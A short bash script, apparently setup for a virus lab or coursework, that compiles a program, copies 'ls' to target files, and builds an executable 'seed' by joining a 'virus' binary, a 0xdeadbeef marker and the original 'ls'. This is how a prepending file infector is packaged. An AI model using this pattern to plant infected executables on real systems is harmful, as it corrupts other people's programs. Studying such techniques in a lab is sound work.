#! /bin/bash
make
chmod a-x ls

rm /tmp/host.1000 mls1 mls2
cp ls mls1
cp ls mls2

cp virus seed
printf '\xde\xad\xbe\xef' >> seed
cat ls >> seed

chmod u+x seed

